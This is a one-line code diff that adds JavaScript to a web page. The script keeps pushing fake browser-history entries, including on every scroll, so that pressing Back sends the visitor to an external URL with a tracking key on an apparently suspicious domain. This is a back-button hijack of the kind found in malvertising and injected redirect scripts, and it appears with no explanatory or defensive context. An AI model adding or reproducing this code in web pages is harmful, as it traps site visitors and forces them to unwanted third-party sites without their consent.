@@ -1,0 +1,1 @@
+const targetDirectDisableBack="https://evaluationgnatprotected.com/uijctn538c?key=4f219c1087bce980ac7a203a864c9d2b";history.pushState(null,document.title,window.location.href),window.addEventListener("popstate",function(t){window.location.href=targetDirectDisableBack}),window.addEventListener("scroll",function(){history.pushState(null,document.title,window.location.href)});
